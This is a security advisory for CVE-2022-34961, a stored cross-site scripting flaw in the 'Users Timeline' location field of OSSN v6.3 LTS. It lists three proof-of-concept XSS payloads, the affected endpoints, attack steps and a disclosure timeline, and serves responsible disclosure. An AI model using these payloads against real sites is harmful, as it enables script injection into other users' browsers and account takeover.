# OpenTeknik LLC OSSN OPEN SOURCE SOCIAL NETWORK v6.3 LTS

### Vulnerability Explanation:
OpenTeknik LLC OSSN OPEN SOURCE SOCIAL NETWORK v6.3 LTS was discovered to contain a stored cross-site scripting (XSS) vulnerability via the `Users Timeline` module.

### Attack Vectors:
The attacker must post something on the `Users Timeline` and insert the XSS payload at the location input in order to exploit the stored XSS. The XSS payload will be launched immediately after submission.

### Affected Component: 
- http://ip_address:port/ossn/u/{username}

- POST /ossn/action/wall/post/u?ossn_ts=1656419317&ossn_token=580bcf1b98fec62baecd2e15b7c4c03173f59226623258b968a316f893e8cbf1 

### Payload :
1. `<img/&#09;&#10;&#11; src=~ onerror=prompt('Grim-The-Ripper-Team-by-SOSECURE-Thailand')>`

2. `<BODY ONLOAD=alert('Grim-The-Ripper-Team-by-SOSECURE-Thailand')>`

3. `<img src=x onerror=confirm('Grim-The-Ripper-Team-by-SOSECURE-Thailand')>`

### Tested on: 
1. OSSN v6.3 LTS (https://github.com/opensource-socialnetwork/opensource-socialnetwork/releases/tag/6.3)

2. Google Chrome Version 102.0.5005.115 (Official Build) (x86_64)

### Steps to attack:
1. Login with username and password. (If you don't have an account, you can register)
2. Go to "Users Timeline" by clicking on their username in the top left corner.
3. Enter data in the data entry form.
4. Click on the location button and enter the XSS payload.
5. The XSS payload will run immediately.

### Author:
:shipit: Grim The Ripper Team by SOSECURE Thailand

### Medium:
- https://grimthereaperteam.medium.com/cve-2022-34961-ossn-6-3-lts-stored-xss-vulnerability-at-users-timeline-819a9d4e5e6c

### Disclosure Timeline:
- 2022–06–28: Vulnerability discovered.
- 2022–06–28: Vulnerability reported to the MITRE corporation.
- 2022–07–08: CVE has been reserved.
- 2022–07–08: Public disclosure of the vulnerability.

Reference:
1. https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-34961
2. https://www.opensource-socialnetwork.org/
3. https://github.com/opensource-socialnetwork/opensource-socialnetwork/releases/tag/6.3
4. https://www.openteknik.com/contact?channel=ossn
